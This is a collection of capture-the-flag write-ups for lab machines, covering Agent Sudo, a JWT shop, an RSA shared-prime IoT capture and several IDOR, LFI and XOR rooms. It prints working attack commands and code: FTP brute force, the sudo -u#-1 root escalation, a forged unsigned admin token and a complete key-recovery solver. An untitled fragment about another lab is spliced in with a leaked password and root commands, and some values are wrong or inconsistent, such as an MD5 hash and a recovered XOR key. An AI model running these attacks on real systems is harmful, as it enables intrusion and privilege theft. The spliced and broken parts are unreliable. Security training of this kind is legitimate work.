content: You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. TL;DR Agent Sudo is an easy-difficulty boot2root room on TryHackMe. The exploitation chain starts with web reconnaissance and discovering that custom HTTP User-Agent headers redirect to an internal page revealing an agent’s username. Brute-forcing the FTP service yields credentials and two steganographic images containing embedded archives and messages. Extracting the hidden data via binwalk and steghide reveals SSH credentials for user james . Finally, analyzing sudo privileges reveals a misconfiguration exploitable via CVE-2019-14287 ( sudo -u#-1 /bin/bash ), granting instant root privileges.
title: Agent Sudo

content: Reconnaissance We begin by scanning the target machine for open ports and services using nmap . nmap -p- -Pn -T4 --min-rate 5000 MACHINE_IP -oG all_ports.txt # Nmap 7.95 scan initiated Tue Oct 27 12:47:14 2026 Host: MACHINE_IP () Status: Up Host: MACHINE_IP () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http/// A more detailed service and script scan on the discovered ports: nmap -sC -sV -p 21,22,80 MACHINE_IP PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel We have three exposed services: Port 21: FTP ( vsftpd 3.0.3 ) Port 22: SSH ( OpenSSH 7.6p1 ) Port 80: HTTP ( Apache 2.4.29 )
title: Agent Sudo

content: Web Enumeration & User-Agent Spoofing Visiting the HTTP web server on port 80 reveals an announcement directed to secret agents: Announcement: Secret Agents To all secret agents, please use your own codename (a single letter, e.g., C, R, J) as your User-Agent to access internal portal directives. This suggests that the web application checks incoming User-Agent headers for authorization. We can test different agent codenames using curl : curl -i -A "C" http://MACHINE_IP/ HTTP/1.1 302 Found Date: Tue, 27 Oct 2026 12:52:00 GMT Server: Apache/2.4.29 (Ubuntu) Location: /agent_C_attention.php Content-Length: 0 Content-Type: text/html; charset=UTF-8 The server returns a 302 Found redirect to /agent_C_attention.php . Following the redirect: curl -sL -A "C" http://MACHINE_IP/ The page contains the following directive: Attention Agent C! Chris, you are the only agent who has not updated your password. Please change your weak password on the FTP server immediately. This gives us two critical pieces of information: The username for Agent C is ** chris **. An FTP service is active with weak credentials.
title: Agent Sudo

content: FTP Brute Force With the username chris identified and port 21 open, we can use hydra with the rockyou.txt wordlist to brute-force the FTP password: hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP [21][ftp] host: MACHINE_IP login: chris password: crystal 1 of 1 target successfully completed, 1 valid password found We obtain the credentials: Services Username Password FTP chris crystal Connecting to the FTP server with the recovered credentials: ftp MACHINE_IP Connected to MACHINE_IP. 220 (vsFTPd 3.0.3) Name (MACHINE_IP:spawn2pwn): chris 331 Please specify the password. Password: crystal 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp> ls -la 229 Entering Extended Passive Mode (|||40123|) 150 Here comes the directory listing. -rw-r--r-- 1 1000 1000 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 1000 1000 34842 Oct 29 2019 cutie.png -rw-r--r-- 1 1000 1000 217 Oct 29 2019 To_agentJ.txt 226 Directory send OK. ftp> prompt off ftp> mget * ftp> exit We download three files from the FTP server: To_agentJ.txt 2. cutie.png 3. cute-alien.jpg —
title: Agent Sudo

content: Steganography & Hash Cracking Let us first examine the text note: cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you. From, Agent C The note tells us that login credentials for Agent J are stored inside one of the images.
title: Agent Sudo

content: Extracting Data from cutie.png Running binwalk against cutie.png reveals an embedded Zip archive: binwalk cutie.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 8702 0x220E Zip archive data, at offset 8702 We extract the embedded files using binwalk -e : binwalk -e cutie.png cd _cutie.png.extracted ls -la The extracted archive 8702.zip is password-protected. We converted it to a readable format by John the Ripper and cracked it: zip2john 8702.zip > hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Loaded 1 password hash (PKZIP [32/64]) alien (8702.zip) 1g 0:00:00:00 DONE (2026-10-27 13:01) 20.00g/s 204800p/s 204800c/s 204800C/s alien The password for the zip file is ** alien **. Extracting the contents with 7z : 7z x 8702.zip -palien cat To_agentR.txt Agent C, We need to send the picture to 'QXJlYTUx' as soon as possible! By, Agent R The message contains a Base64-encoded string: QXJlYTUx . Decoding it gives: echo 'QXJlYTUx' | base64 -d Area51
title: Agent Sudo

content: Extracting Data from cute-alien.jpg Now that we have the passphrase ** Area51 **, we can extract the hidden content embedded in cute-alien.jpg using stegseek (or steghide ): steghide extract -sf cute-alien.jpg -p Area51 wrote extracted data to "message.txt". Checking the extracted text: cat message.txt Hi james, Glad you find this message. Your login password is hackerrules! Don't ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris We now have valid SSH credentials for user james : Fields Value Username james Password hackerrules!
title: Agent Sudo

content: Initial Foothold (SSH) We connect to the machine via SSH as james : ssh james@MACHINE_IP james@MACHINE_IP's password: hackerrules! Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64) james@agent-sudo:~$ whoami james We can now read the user flag located in the home directory: cat /home/james/user.txt
title: Agent Sudo

content: Privilege Escalation (CVE-2019-14287) To identify paths for privilege escalation, we inspect the user’s sudo permissions: sudo -l Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash The entry (ALL, !root) /bin/bash is configured to allow james to run /bin/bash as any user on the system except root. However, older versions of sudo (specifically < 1.8.28 ) are vulnerable to CVE-2019-14287 (Sudo User ID Bypass).
title: Agent Sudo

content: Vulnerability Mechanism When sudo is invoked with the -u flag, it converts the provided user identifier to an integer via setresuid() or setreuid() . If an attacker specifies user ID -1 (or its unsigned equivalent 4294967295 ), the system function interprets -1 as an instruction not to change the user ID. Because the command is already being spawned from the privileged sudo wrapper, the process executes with effective UID 0 (root), cleanly bypassing the !root blacklist check. We can exploit this by running: sudo -u#-1 /bin/bash james@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# whoami root root@agent-sudo:~# id uid=0(root) gid=0(root) groups=0(root) We instantly obtain an interactive root shell. We can now capture the root flag: cat /root/root.txt
title: Agent Sudo

content: Conclusion Agent Sudo provides a clear demonstration of how multiple minor weaknesses combine into a complete compromise: Information Disclosure via Headers: Trusting client-supplied User-Agent values exposed internal usernames and service roles. Weak Service Passwords: Using easily guessable passwords on exposed management services (FTP) enabled immediate unauthorized access. Insecure Data Storage: Embedding plaintext credentials within Steganographic images and easily crackable ZIP archives provided false security. Outdated Sudo Binaries: Relying on negative permission lists ( !root ) in sudoers without patching against known parser vulnerabilities (CVE-2019-14287) led directly to arbitrary root code execution. Remediation: Ensure strong, complex passwords across all services. Avoid relying on client-controlled HTTP headers for application routing or authentication. Keep system binaries up to date; update sudo to version 1.8.28 or newer to mitigate CVE-2019-14287.
title: Agent Sudo

content: Access the hidden item in this Valentine’s gift shop. TL;DR TryHeartMe is an easy TryHackMe web challenge that demonstrates a JWT signature-stripping vulnerability. By modifying the JWT payload to change the role claim from user to admin and removing the signature, it is possible to escalate privileges, gain access to the admin dashboard, and purchase the hidden ValenFlag item.
title: TryHeartMe

content: Scenario The challenge description provides us with the following message: My Dearest Hacker, The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item? You can access the web app here: http://MACHINE_IP:5000
title: TryHeartMe

content: Initial Reconnaissance After opening the provided URL, we are greeted by the TryHeartMe Valentine’s Shop, a web application where users can browse and purchase items. When attempting to purchase an item, we are prompted to log in first. I created an account and signed in to explore the application’s functionality. After logging in, I noticed that my account had a balance of zero credits, which prevented me from purchasing anything. Attempting to buy an item resulted in the following error message: Not enough credits. Online top-ups are currently disabled.
title: TryHeartMe

content: Analyzing the JWT While exploring the application, I noticed the Role: user badge displayed in the interface. This caught my attention and prompted me to inspect the browser’s cookies. The session cookie turned out to be a JSON Web Token (JWT). Its structure looked like this: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjFAMS4xIiwicm9sZSI6InVzZXIiLCJjcmVkaXRzIjowLCJpYXQiOjE3OTIzNzgzMzcsInRoZW1lIjoidmFsZW50aW5lIn0.k50WLenwMhmnNS9fuGdFG-PeQ2GESJovgZZ2o0fyGzU To make inspecting and modifying the token easier, I used the Token.dev JWT Debugger. After decoding the JWT, I found that its payload contained several claims, including email, role, and credits. The role claim was set to user, while credits was set to 0. This raised the possibility that the application might be trusting client-controlled JWT claims without properly validating the token’s signature.
title: TryHeartMe

content: Exploiting Signature Stripping To test this hypothesis, I changed the role claim in the JWT payload from user to admin. Instead of generating a valid signature, I removed the signature entirely, leaving only the header and payload, followed by a trailing dot. The modified JWT looked like this: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjFAMS4xIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6MCwiaWF0IjoxNzkyMzc4MzM3LCJ0aGVtZSI6InZhbGVudGluZSJ9. This was a test for a potential JWT signature-stripping vulnerability: if the server accepted the modified token without verifying its signature, it could allow an attacker to tamper with claims such as the user’s role. I replaced the original session cookie with the modified JWT and refreshed the page. Surprisingly, the application accepted the modified token and granted me administrative privileges. My account also displayed a balance of 5,000 credits. This confirmed that the application was vulnerable to JWT tampering because it accepted a token with a modified role claim and no signature.
title: TryHeartMe

content: Accessing the Admin Dashboard After successfully escalating my privileges, a new Admin option appeared in the navigation bar. Clicking it redirected me to the following endpoint: http://MACHINE_IP:5000/admin The admin dashboard revealed a product called ValenFlag, accompanied by the following description: Staff-only purchase The ValenFlag item is visible to staff and prints a voucher receipt. This indicated that the hidden item was restricted to users with elevated privileges.
title: TryHeartMe

content: Retrieving the Flag With administrative access, I clicked Open ValenFlag, which redirected me to: http://MACHINE_IP:5000/product/valenflag I then clicked the Buy button on the product page. The purchase succeeded, and the application displayed the flag.
title: TryHeartMe

content: Conclusion This challenge demonstrated how improper JWT signature validation can lead to privilege escalation. By modifying the role claim from user to admin and removing the token’s signature, I was able to bypass the application’s intended access controls, obtain administrative privileges, and purchase the hidden ValenFlag item. Key takeaway: JWT signatures must always be validated server-side using an explicitly configured algorithm. Applications should reject unsigned tokens unless they are intentionally supported by a secure design, and authorization decisions must never rely on unverified JWT claims.
title: TryHeartMe

content: Mira sent her research results from MIRA-NODE to INGGID-HUB. The gateway reported the transfer was successful, but the file never arrived at the receiver’s end. The only remaining artifact is penelitian.pcap . Trace the communication between the two devices, reconstruct the transmitted data, and find what is hidden within the research findings. TL;DR The research file was transmitted as 24 AES-128-CBC encrypted chunks over MQTT. The AES key was wrapped using INGGID-HUB’s RSA-1024 public key. Both devices (MIRA-NODE and INGGID-HUB) generated their RSA keys using a shared prime due to an outdated demo prototype configuration. Calculating gcd⁡(N1,N2)\gcd(N_1, N_2)gcd(N1​,N2​) instantly factors both moduli, recovering INGGID-HUB’s private key. After decrypting the AES session key, reassembling the 24 chunks, and unzipping the archive, the flag was extracted from the EXIF ​​ UserComment metadata of dragonfly.jpg .
title: IoT Security Research

content: 1. Network Reconnaissance (PCAP) We begin by inspecting the protocol hierarchy and conversation endpoints in penelitian.pcap using tshark : tshark -r penelitian.pcap -q -z io,phs frame frames:121 bytes:15314 tcp frames:108 → mqtt frames:51 udp frames:9 → data frames:8, dns frames:1 icmp frames:2 arp frames:2 We identified three distinct hosts active on the lab network 10.13.37.0/24 : IP Address Roles Description 10.13.37.10 MQTT Broker Standard MQTT service listening on port 1883 10.13.37.21 MIRA-NODE Transmitter sending encrypted payload chunks 10.13.37.22 INGGID-HUB Receiver/Gateway nodes UDP packets directed to port 1883 (containing iot/sensor/temperature {"v":23.x} ) and DNS queries to time.lab.local are background sensor telemetry noise. The critical communication occurs over MQTT.
title: IoT Security Research

content: 2. Extracting MQTT Messages We dump all MQTT publish packets with their topic names and payloads: tshark -r penelitian.pcap -Y mqtt -T fields \ -e frame.number -e ip.src -e mqtt.topic -e mqtt.msg Key topics identified in the stream: Frames Topics Payload Description 53 iot/crypto/public RSA public key for MIRA-NODE ( n , e=65537 ) 68 iot/crypto/public RSA public key for INGGID-HUB ( n , e=65537 ) 57 iot/crypto/session Encrypted session key ( TX-4812 , RSA-1024-RAW-PKCS1 ) 61 iot/transfer/meta Metadata transfer: filename, cipher, IV, total chunks, SHA-256 65–120 iot/transfer/data/0001..0024 24 sequential ciphertext hex chunks 80 iot/transfer/ack Gateway acknowledgment ( {"state":"complete","chunks":24} ) A chat log found in lab/chat/* yields a critical operational clue: inggid : The prototype encryption from yesterday is still active. mira : Still using the keys from the initial demo? inggid : Yes, haven't had time to regenerate everything. inggid : The crypto configuration is inherited directly from the demo, I only changed the device names. Inheriting crypto configuration without regenerating primes strongly suggests that both devices share a common prime factor in their RSA moduli. Parsing the metadata in frame 61 :
title: IoT Security Research

content: 3. RSA Shared-Prime Factorization Attack (GCD) Both devices published 1024-bit RSA moduli: Nmira=p⋅q1N_{\text{mira}} = p \cdot q_1Nmira​=p⋅q1​ Ninggid=p⋅q2N_{\text{inggid}} = p \cdot q_2Ninggid​=p⋅q2​ Because they share the prime ppp, we can compute: p=gcd⁡(Nmira,Ninggid)p = \gcd(N_{\text{mira}}, N_{\text{inggid}})p=gcd(Nmira​,Ninggid​) q2=Ninggidpq_2 = \frac{N_{\text{inggid}}}{p}q2​=pNinggid​​ import math p = math.gcd(n_mira, n_inggid) print(f"Shared prime bit length: {p.bit_length()}") # 512 bits q2 = n_inggid // p With the private prime factors recovered for INGGID-HUB, we compute Euler’s totient function ϕ(Ninggid)=(p−1)(q2−1)\phi(N_{\text{inggid}}) = (p - 1)(q_2 - 1)ϕ(Ninggid​)=(p−1)(q2​−1) and the private exponent ddd: d=e−1(modϕ(Ninggid))d = e^{-1} \pmod{\phi(N_{\text{inggid}})}d=e−1(modϕ(Ninggid​)) The session key was sent from MIRA-NODE to INGGID-HUB’s public key in frame 57 . Decrypting the PKCS#1 v1.5 ciphertext: c = int.from_bytes(bytes.fromhex(encrypted_session_key), "big") d = pow(65537, -1, (p - 1) * (q2 - 1)) m = pow(c, d, n_inggid) pt = m.to_bytes((m.bit_length() + 7) // 8, "big") key = pt[pt.index(b"\x00", 1) + 1 :] print("Recovered AES-128 Key:", key.hex()) Output: Recovered AES-128 Key: 54ec152c2eef3d9d1061228ed56c2586
title: IoT Security Research

content: 4. Reassembling & Decrypting the Research File We concatenate the 24 payload chunks in order ( 0001 through 0024 ) and verify the resulting SHA-256 against ciphertext_sha256 : cipher = b"".join(chunks[f"{i:04d}"] for i in range(1, 25)) assert hashlib.sha256(cipher).hexdigest() == meta["ciphertext_sha256"] We decrypt the binary using OpenSSL with AES-128-CBC: openssl enc -d -aes-128-cbc \ -K 54ec152c2eef3d9d1061228ed56c2586 \ -iv d2597bb0b5d9c63a481ca46228900764 \ -in cipher.bin -out hasil_penelitian.zip The decrypted file is a valid Zip archive ( PK\x03\x04 header). Unpacking it reveals: hasil_penelitian.zip ├── README.txt ├── dragonfly.jpg ├── experiment.log └── sensor_data.csv
title: IoT Security Research

content: 5. Capturing the Flag README.txt contains a hint: “Mira, I saved the final results inside the image metadata.” Extracting strings from dragonfly.jpg : strings dragonfly.jpg | grep NEC NEC{r3us3d_pr1m3s_l34k_th3_r3s34rch} The flag is embedded directly in the EXIF UserComment tag.
title: IoT Security Research

content: Complete Automated Solver #!/usr/bin/env python3 import hashlib import json import math import subprocess PCAP = "penelitian.pcap" # 1. Extract MQTT payloads from PCAP out = subprocess.run( ["tshark", "-r", PCAP, "-Y", "mqtt", "-T", "fields", "-e", "mqtt.topic", "-e", "mqtt.msg"], capture_output=True, text=True ).stdout pubs, session, meta, chunks = {}, None, None, {} for line in out.strip().splitlines(): parts = line.split("\t") if len(parts) < 2 or not parts[-1]: continue topic, msg = parts[0], parts[1] raw = bytes.fromhex(msg) if topic == "iot/crypto/public": j = json.loads(raw) pubs[j["device"]] = (int(j["n"]), int(j["e"])) elif topic == "iot/crypto/session": session = json.loads(raw) elif topic == "iot/transfer/meta": meta = json.loads(raw) elif topic.startswith("iot/transfer/data/"): chunks[topic.split("/")[-1]] = raw n_mira, e = pubs["MIRA-NODE"] n_ingg, _ = pubs["INGGID-HUB"] # 2. Shared-prime GCD attack p = math.gcd(n_mira, n_ingg) q = n_ingg // p assert p * q == n_ingg # 3. Decrypt AES session key c = int.from_bytes(bytes.fromhex(session["encrypted_session_key"]), "big") d = pow(e, -1, (p - 1) * (q - 1)) m = pow(c, d, n_ingg) pt = m.to_bytes((m.bit_length() + 7) // 8, "big") key = pt[pt.index(b"\x00", 1) + 1 :] print("[+] AES key:", key.hex()) # 4. Reassemble chunks & verify hash cipher = b"".join(chunks[f"{i:04d}"] for i in range(1, meta["chunks"] + 1)) assert hashlib.sha256(cipher).hexdigest() == meta["ciphertext_sha256"] open("/tmp/cipher.bin", "wb").write(cipher) # 5. Decrypt archive & extract flag subprocess.run( ["openssl", "enc", "-d", "-aes-128-cbc", "-K", key.hex(), "-iv", meta["iv"], "-in", "/tmp/cipher.bin", "-out", "/tmp/hasil.zip"], check=True ) subprocess.run(["unzip", "-o", "/tmp/hasil.zip", "-d", "/tmp/hasil_out"], check=True) jpg = open("/tmp/hasil_out/dragonfly.jpg", "rb").read() idx = jpg.find(b"NEC{") flag = jpg[idx : jpg.find(b"}", idx) + 1].decode() print("[+] Flag :", flag)
title: IoT Security Research

content: Security Lessons Never reuse RSA primes across keys: A single greatest common divisor (gcd⁡\gcdgcd) computation against public moduli breaks the private key of every affected entity. This vulnerability has been widely studied in embedded systems (e.g., Heninger et al., “Mining Your Ps and Qs”). Prototype Configurations in Production: Retaining demo cryptographic templates with static seeds or shared parameters is a recurring root cause in IoT security breaches. Unencrypted Transport Metadata: Broadcasting protocol parameters (IV, chunk size, expected SHA-256 hash) in plaintext aids attackers in verifying payload integrity and decryption attempts.
title: IoT Security Research

content: 1. Recon $ curl -i https://lab-3-249-145-98.hdna.me/ HTTP/2 200 | server: cloudflare | content-type: text/html Flask + Jinja2 (a typical Werkzeug error page), behind Cloudflare. Public routes: / , /search?q= , /register , /login , /cover.svg?k=&t= , /track/<id> , /artist/<id> , /album/<id> . API (arises from inline JS): /api/me , /api/profile , /api/playlist , /api/my_playlists , /api/playlist/<id>/tracks . /cover.svg?k=<seed>&t=<text> — cover generator: k hashed to hue ( hsl(...) ), t to SVG text. Not command injection (tested: $((50+50)) , id , ;sleep → all literals, hue = string deterministic hash). Key insight: register → upload track → page /track/<id> has a “Processing output” panel ( <pre class="log"> ) that displays the ffmpeg log encoder + “tag check” results. This is a reflected RCE sink.

content: 2. Linux Capabilities → root (root flag) From the djcarter shell : $ find / -perm -4000 -type f 2>/dev/null /usr/bin/su /usr/bin/passwd ... /usr/local/bin/pwnify-enc $ ls -la /usr/local/bin/pwnify-enc -rwsr-x---. 1 root transcoder 70744 ... pwnify-enc ← SUID root, group transcoder $ cat /usr/local/bin/entrypoint.sh setcap cap_setuid+ep /usr/local/bin/pwnify-enc 2>/dev/null || true ** pwnify-enc = SUID root:transcoder + capability cap_setuid+ep ** (restored at runtime by entrypoint; AWS ECS discards xattr setcap when unpacking image — that’s why it is reapplied by PID 1). Executable only for group transcoder — djcarter (pwteam) cannot directly. /opt/pwnify/transcoder/config.ini (readable by group pwteam ) service credential leak: [service] user = transcoder password = Tr4nscoderSvc9912 SSH as transcoder (same SSH_ASKPASS trick), then execute the helper: $ /usr/local/bin/pwnify-enc --uid 0 id uid=0(root) gid=1002(transcoder) groups=1002(transcoder),1000(pwteam) $ /usr/local/bin/pwnify-enc --uid 0 cat /root/flag-root.txt 4b097a8e-7de1-4688-8f81-f36cf5208abe ← ROOT FLAG How pwnify-enc works (from strings): --uid <service-uid> <command> → setuid(uid) → execvp(command) . content: Can you escape the Corridor? TL;DR Corridor is an easy TryHackMe room that introduces the concept of Insecure Direct Object References (IDOR). By analyzing the application’s URL structure, we discover that each endpoint is simply the MD5 hash of a sequential integer. Since the application only exposes hashes for the numbers 1–13, generating the MD5 hash for 0 allows us to access a hidden endpoint and retrieve the flag.
title: Corridor

content: Scenario In this room, we are placed inside a mysterious corridor filled with multiple doors. The challenge description hints at an IDOR vulnerability and encourages us to pay close attention to the URL endpoints while navigating the application. You have found yourself in a strange corridor. Can you find your way back to where you came? Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find. They look an awful lot like a hash, don’t they? Upon visiting the application, we are presented with the following page. Each door is clickable, so I opened one of them to see where it would lead. The page simply displays an empty white room with no visible content. Inspecting the page source also reveals nothing particularly interesting. <!DOCTYPE html> <html lang="en"> <head> ... </head> <body> <style> body{ background-image: url("/static/img/empty_room.jpg"); background-size: cover; } </style> </body> </html> Since the destination page did not reveal anything useful, I returned to the main corridor and inspected its source code instead. <map name="image-map"> <area alt="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b"> <area alt="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c"> <area alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3"> ... </map> Immediately, something stood out. Every door pointed to an endpoint consisting of a 32-character hexadecimal string. Combined with the challenge description mentioning hexadecimal values, it strongly suggested that these values were MD5 hashes rather than random identifiers. To verify this assumption, I used CrackStation to identify several of the hashes. The results confirmed that they were simply MD5 hashes of sequential integers. MD5 Hash Value c4ca4238a0b923820dcc509a6f75849b 1 c81e728d9d4c2f636f067f89cc14862c 2 eccbc87e4b5ce2fe28308fd9f98764da 3 … … At this point, it became clear that the application only exposed doors corresponding to the numbers 1 through 13. Since the room description hinted at finding a location we were not intended to access, the next logical step was to generate the MD5 hash for 0, which was missing from the corridor. This can be done locally with: echo -n "0" | md5sum Output: cfcd208495d565ef66e7dff9f98764da Finally, I visited the following endpoint: http://MACHINE_IP/cfcd208495d565ef66e7dff9f98764da Instead of another empty room, the application returned the flag.
title: Corridor

content: Explanation This challenge demonstrates a classic Insecure Direct Object Reference (IDOR). The application attempts to hide resources by replacing simple numeric identifiers with their MD5 hashes. However, hashing is not authorization. Since the identifiers are predictable (0, 1, 2, 3, …), an attacker can easily generate the corresponding hashes and access resources that were never linked in the user interface. In this case, the developer assumed that hiding object identifiers behind MD5 hashes would prevent users from discovering other endpoints. Because the identifiers followed a predictable sequence, generating the hash for the missing value (0) allowed us to access the hidden resource and obtain the flag.
title: Corridor

content: Can you bypass the engine? TL;DR Fool’s Mate is an easy TryHackMe web challenge that demonstrates why client-side security controls cannot be trusted. Although the application prevents a winning chess move in the browser, the backend API still accepts the request when it is modified and sent manually through Burp Suite.
title: Fools Mate

content: Initial Analysis The target is a web-based chess endgame trainer. When opening the application, we are presented with a chessboard and instructed to deliver checkmate in one move. The white rook on a1 can move to a8, delivering checkmate to the black king on g8. However, attempting this move through the web interface triggers a warning popup instead of allowing the move. The message indicates that the restriction is enforced by the client-side application. This suggests that the move may still be accepted if the underlying API request is modified directly.
title: Fools Mate

content: Intercepting a Valid Move To inspect how moves are submitted, I enabled Burp Suite interception and moved the rook to another valid square. This produced the following request: POST /api/move HTTP/1.1 Host: 10.112.144.55 Content-Type: application/json { "from": "a1", "to": "b1" } The application sends the source and destination squares as JSON values. The browser blocks the checkmating move, but the server endpoint itself can still be tested manually.
title: Fools Mate

content: Bypassing the Client-Side Restriction I changed the destination square from b1 to a8, then forwarded the modified request: The server accepted the move and returned a successful response indicating that the position was checkmate. The flag was included in the response body.
title: Fools Mate

content: Key Takeaway The application relied on a client-side restriction to prevent the winning move. Since browser-side JavaScript can be modified or bypassed by an attacker, it must never be treated as a security boundary. Security-sensitive validation should always be implemented on the server side. In this case, the backend should independently validate whether a move is allowed before returning the game result or exposing the flag.
title: Fools Mate

content: Check out our new cloud service, Authentication Anywhere. Can you find other users’ secrets? TL;DR Neighbour is an easy TryHackMe room that demonstrates an Insecure Direct Object Reference (IDOR) vulnerability. The application fails to enforce authorization checks on the profile endpoint, allowing an authenticated user to access another user’s profile by modifying the user query parameter.
title: Neighbour

content: Initial Access We are provided with a website containing a login form. The page instructs us to inspect its source code using Ctrl+U. Reviewing the HTML source reveals a comment containing credentials for a guest account. Using these credentials, we can authenticate as the guest user.
title: Neighbour

content: Identifying the IDOR Vulnerability After logging in, the browser is redirected to the following URL: http://MACHINE_IP/profile.php?user=guest The application uses the user query parameter to determine which profile should be displayed. However, the server does not verify whether the authenticated user is authorized to access the requested profile. Because the current account is guest, the parameter is set to: user=guest We can test for an IDOR vulnerability by changing the parameter value from guest to admin: http://MACHINE_IP/profile.php?user=admin The application then loads the administrator’s profile and exposes the flag.
title: Neighbour

content: Conclusion This room demonstrates how broken access control can lead to unauthorized access to sensitive user data. Although the application requires authentication, it relies entirely on a user-controlled URL parameter without validating ownership or permissions. To prevent this issue, the server should derive the current user’s identity from the authenticated session rather than trusting a client-controlled parameter. If access to other profiles is required, the application must perform an authorization check before returning the requested data.
title: Neighbour

content: Want to hear some lo-fi beats while relaxing or studying? We’ve got you covered! TL;DR Lo-Fi is an easy TryHackMe room that demonstrates a Local File Inclusion (LFI) vulnerability. By exploiting the vulnerable page parameter, it is possible to read arbitrary files from the server, including /etc/passwd .
title: Lo-Fi

content: Overview The target provides a web application with a simple interface. Clicking the Sleep option redirects the browser to the following URL: http://MACHINE_IP/?page=sleep.php The application uses the page parameter to load sleep.php . Since user-controlled input is passed through a parameter that appears to select a file, this behavior suggests a potential Local File Inclusion (LFI) vulnerability. An LFI vulnerability occurs when an application includes a file based on user input without properly validating or restricting the requested path. If successfully exploited, an attacker may be able to read sensitive files stored on the server. A common file used to confirm LFI is /etc/passwd , as it contains information about local system accounts. I initially attempted to access it directly through the page parameter. The direct request was blocked, indicating that the application likely has a filter preventing paths that begin from the root directory. To bypass this restriction, I referred to the File Inclusion section of the PayloadsAllTheThings repository. The repository contains useful payload references for a wide range of web vulnerabilities, including LFI bypass techniques. Instead of referencing /etc/passwd directly from the root directory, I used directory traversal sequences to move upward through the file system before targeting the file. This technique is commonly known as directory climbing. The payload successfully confirmed the LFI vulnerability. After confirming the vulnerability, I used the same directory traversal technique to search for the flag file. In TryHackMe rooms, flags are commonly stored in files such as flag.txt . ##Conclusion The Lo-Fi room demonstrates how insecure file inclusion can lead to Local File Inclusion vulnerabilities. The vulnerable page parameter allowed directory traversal, enabling access to files outside the intended application directory. To prevent this issue, applications should avoid directly including files based on user-controlled input. A safer approach is to use an allowlist of permitted page names and map them to fixed server-side file paths.
title: Lo-Fi
W1seGuy

content: Source Code Analysis The server encrypts a known plaintext using repeating-key XOR. The plaintext used to generate the first ciphertext is hardcoded in the setup() function: flag = 'THM{thisisafakeflag}' The encryption key is randomly generated using alphanumeric characters and has a fixed length of five characters: res = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) key = str(res) The following expression is responsible for repeating the key: key[i % len(key)] The modulo operator (%) resets the key index to the beginning once it reaches the end of the key. Since the key length is five bytes, it is repeated across the plaintext as follows: Plaintext : T H M { t h i s i s a f a k e f l a g } Key : K0 K1 K2 K3 K4 K0 K1 K2 K3 K4 K0 K1 K2 K3 K4 K0 K1 K2 K3 K4 Each plaintext byte is XORed with the corresponding key byte: xored += chr(ord(flag[i]) ^ ord(key[i % len(key)])) Finally, the XOR output is converted into hexadecimal before being sent to the client: hex_encoded = xored.encode().hex() Therefore, the received ciphertext must first be decoded from hexadecimal into raw bytes before XOR operations can be performed.
title: W1seGuy

content: Known-Plaintext Attack For XOR encryption, the relationship between plaintext, ciphertext, and key is: Ci=Pi⊕KiC_i = P_i \oplus K_iCi​=Pi​⊕Ki​ Where: CiC_iCi​ is the ciphertext byte at position iii, PiP_iPi​ is the plaintext byte at position iii, KiK_iKi​ is the key byte at position iii, ⊕\oplus⊕ represents the XOR operation. Because XOR is reversible, the key can be recovered when both the plaintext and ciphertext are known: Ki=Ci⊕PiK_i = C_i \oplus P_iKi​=Ci​⊕Pi​ In this challenge, the plaintext is known because the fake flag is hardcoded in the source code: THM{thisisafakeflag} The first four plaintext bytes are: T H M { These bytes correspond directly to the first four ciphertext bytes. Therefore, the first four key bytes can be recovered with: K0=C0⊕TK_0 = C_0 \oplus \texttt{T}K0​=C0​⊕TK1=C1⊕HK_1 = C_1 \oplus \texttt{H}K1​=C1​⊕HK2=C2⊕MK_2 = C_2 \oplus \texttt{M}K2​=C2​⊕MK3=C3⊕{K_3 = C_3 \oplus \texttt{\{}K3​=C3​⊕{ The ciphertext received from the server can be decoded and XORed with the known plaintext prefix: >>> encrypted_flag = bytes.fromhex( ... "6504222a45002d033f4174341b104145780c3a5670221d62545d0016396043381661404334202348" ... ) >>> known_plaintext = b"THM{" >>> recovered_key = bytes(a ^ b for a, b in zip(encrypted_flag, known_plaintext)) >>> print(recovered_key) b'1LoQ' At this point, four of the five key bytes have been recovered: Key K0 K1 K2 K3 K4 Recovered 1 L o q ?
title: W1seGuy

